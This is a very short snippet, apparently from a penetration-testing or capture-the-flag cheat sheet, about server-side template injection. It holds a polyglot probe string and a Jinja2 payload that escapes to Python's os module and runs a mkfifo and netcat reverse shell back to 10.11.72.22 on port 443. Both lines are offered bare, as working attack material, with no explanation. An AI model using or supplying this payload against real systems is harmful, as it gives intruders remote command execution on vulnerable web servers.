

```bash

payload: ${{<%[%'\"}}%\\.
```


Jinja2

```python

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.72.22 443 >/tmp/f').read() }}

```

